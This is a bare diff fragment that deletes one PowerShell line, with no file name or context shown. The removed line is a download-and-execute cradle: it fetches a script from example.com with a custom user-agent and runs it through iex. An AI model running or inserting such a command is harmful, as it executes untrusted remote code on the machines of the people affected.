@@ -1,1 +1,0 @@
-$webClient = New-Object System.Net.WebClient; $webClient.Headers.Add('user-agent', 'MyCustomAgent'); iex ($webClient.DownloadString('http://example.com/script.ps1'))
